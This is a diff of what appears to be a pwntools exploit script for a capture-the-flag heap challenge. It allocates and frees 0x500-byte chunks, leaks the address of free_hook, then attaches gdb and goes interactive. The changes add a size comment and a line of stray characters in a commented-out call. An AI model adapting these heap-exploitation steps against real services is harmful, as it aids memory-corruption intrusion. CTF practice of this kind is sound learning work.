@@ -43,6 +43,7 @@ def show(page):
     r.sendlineafter(b'>',b'4')
     r.sendlineafter(b'Index: ', str(page).encode())
 
+# size > 0x500
 add(0,0x500)
 add(1,0x500)
 delete(0)
@@ -60,6 +61,6 @@ info('free_hook :'+hex(free_hook))
 gdb.attach(r)
 pause()
 # r.sendlineafter()
-# r.send()
+# r.send()11wwwwwwwwwwwwwwwwwww
 # r.recvuntil()
 r.interactive()
